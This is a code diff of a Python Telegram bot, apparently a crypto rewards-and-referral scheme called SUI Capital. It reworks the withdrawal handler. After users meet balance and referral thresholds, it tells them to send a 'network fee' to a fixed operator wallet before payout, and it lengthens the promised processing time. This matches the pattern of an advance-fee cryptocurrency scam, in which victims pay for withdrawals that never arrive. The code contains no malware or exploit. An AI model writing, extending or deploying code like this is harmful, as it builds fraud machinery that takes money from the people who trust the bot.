@@ -419,49 +419,51 @@ class SUIBot:
             )
             return
 
-        # First show minimum requirements
+        # Get current balance and referrals
+        balance = Decimal(user_data["balance"])
+        referrals = user_data["referrals"]
+
+        # First message: Show requirements and status
         await update.message.reply_text(
-            f"💰 Minimum Requirements for Withdrawal:\n\n"
-            f"• Minimum Balance: {REWARDS['min_withdraw']} SUI\n"
-            f"• Minimum Referrals: {REWARDS['min_referrals']}\n\n"
-            f"Your Current Status:\n"
-            f"• Balance: {user_data['balance']} SUI\n"
-            f"• Referrals: {user_data['referrals']}\n\n"
+            f"⭐ Withdrawal Information\n\n"
+            f"💰 Minimum Requirements:\n"
+            f"• Balance Required: {REWARDS['min_withdraw']} SUI\n"
+            f"• Referrals Required: {REWARDS['min_referrals']}\n\n"
+            f"📊 Your Current Status:\n"
+            f"• Your Balance: {balance:.8f} SUI\n"
+            f"• Your Referrals: {referrals}\n\n"
             f"📢 Required Channels:\n"
             f"• @SUI_Capital_Tracker\n"
             f"• @SUI_Capital_News\n"
             f"• @SUI_Capital_QA"
         )
 
-        # Check referrals requirement
-        if user_data["referrals"] < REWARDS["min_referrals"]:
+        # Second message: Show specific requirement not met
+        if referrals < REWARDS["min_referrals"]:
             await update.message.reply_text(
                 f"⚠️ You need at least {REWARDS['min_referrals']} referrals to withdraw!\n"
-                f"Your referrals: {user_data['referrals']}"
+                f"Your referrals: {referrals}"
             )
             return
 
-        # Check minimum balance
-        balance = Decimal(user_data["balance"])
         if balance < REWARDS["min_withdraw"]:
             await update.message.reply_text(
-                f"⚠️ Minimum withdrawal: {REWARDS['min_withdraw']} SUI\n"
-                f"Your balance: {balance} SUI"
+                f"⚠️ Minimum withdrawal amount is {REWARDS['min_withdraw']} SUI\n"
+                f"Your balance: {balance:.8f} SUI"
             )
             return
 
         # If all requirements are met, show withdrawal info
         await update.message.reply_text(
-            f"⭐ Withdrawal Request\n\n"
-            f"Amount to Withdraw: {balance} SUI\n"
-            f"🔸 Destination Wallet: {user_data['wallet']}\n"
-            f"🔸 Network Used: SUI Network (SUI)\n\n"
-            f"📢 Network Fee: {REWARDS['network_fee']} SUI (required to process the transaction)\n\n"
-            f"📨 Please send the fee to the following wallet to complete your request:\n"
+            f"✅ Withdrawal Request\n\n"
+            f"💎 Amount: {balance:.8f} SUI\n"
+            f"🔸 Wallet: {user_data['wallet']}\n"
+            f"🔸 Network: SUI Network (SUI)\n\n"
+            f"📢 Network Fee: {REWARDS['network_fee']} SUI\n\n"
+            f"📨 Send fee to:\n"
             f"`{SUI_ADDRESS}`\n\n"
-            f"⌛ Processing Time: 5 minutes after the fee payment is confirmed.\n\n"
-            f"⚠️ Important Note: The network fee is necessary to cover SUI network operational costs "
-            f"and ensure the success of your transfer. Without this payment, your request will not be processed."
+            f"⌛ Processing Time: 24-48 hours\n\n"
+            f"⚠️ Note: Network fee is required for transaction processing"
         )
 
     async def handle_wallet(self, update: Update):
@@ -488,7 +490,7 @@ class SUIBot:
                 rows = cur.fetchall()
 
                 if not rows:
-                    await update.message.reply_text("�� No leaders yet!")
+                    await update.message.reply_text("No leaders yet!")
                     return
 
                 message = "🏆 Top 10 Leaders:\n\n"
